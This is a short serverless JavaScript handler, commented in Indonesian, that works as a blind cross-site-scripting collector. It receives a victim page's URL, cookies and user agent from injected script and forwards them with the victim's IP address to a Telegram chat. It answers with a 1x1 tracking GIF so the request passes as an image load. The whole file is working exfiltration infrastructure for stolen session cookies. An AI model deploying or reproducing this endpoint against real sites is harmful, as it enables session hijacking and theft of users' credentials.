export default async (req, res) => {
  // Ambil token & chat ID dari environment variables
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Data bisa dari GET (query) atau POST (body)
  let marker, url, cookies, userAgent;
  
  if (req.method === 'GET') {
    marker = req.query.marker;
    url = req.query.url;
    cookies = req.query.cookies;
    userAgent = req.query.userAgent;
  } else if (req.method === 'POST') {
    marker = req.body.marker;
    url = req.body.url;
    cookies = req.body.cookies;
    userAgent = req.body.userAgent;
  } else {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  console.log(`[XSS] Marker: ${marker} | URL: ${url}`);

  // Kirim notifikasi ke Telegram
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const message = `🔥 *BLIND XSS TRIGGERED!* 🔥
       
📌 *Marker*: ${marker || 'tidak ada'}
🌐 *URL*: ${url || 'tidak diketahui'}
🍪 *Cookie*: ${cookies || 'tidak ada'}
📱 *User Agent*: ${userAgent || 'tidak ada'}
💻 *IP Address*: ${req.headers['x-forwarded-for'] || 'tidak diketahui'}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  }

  // Balikin gambar 1x1 pixel
  res.setHeader('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
};
